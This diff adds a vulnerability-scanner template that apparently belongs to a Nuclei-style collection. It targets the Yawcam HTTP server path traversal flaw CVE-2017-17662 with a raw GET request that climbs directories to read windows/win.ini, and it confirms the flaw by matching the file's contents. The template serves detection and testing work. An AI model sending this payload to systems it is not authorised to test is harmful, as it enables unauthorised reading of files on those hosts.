@@ -1,0 +1,30 @@
+id: yawcam-path-traversal
+info:
+  name: Yawcam HTTP Server Path Traversal Vulnerability (CVE-2017-17662)
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    A directory traversal vulnerability exists in the HTTP server from Yawcam versions 0.2.6 to 0.6.0. A remote attacker can exploit this vulnerability to read arbitrary files using the '.x./' or '....\x/' sequence.
+  classification:
+    cvss-score: 7.5
+    cve-id: CVE-2017-17662
+  tags: path-traversal,file-inclusion
+http:
+  - raw:
+      - |
+        GET /.\./.\./.\./.\./.\./windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "for 16-bit app support"
+          - "[extensions]"
+      - type: word
+        part: header
+        words:
+          - "200 OK"
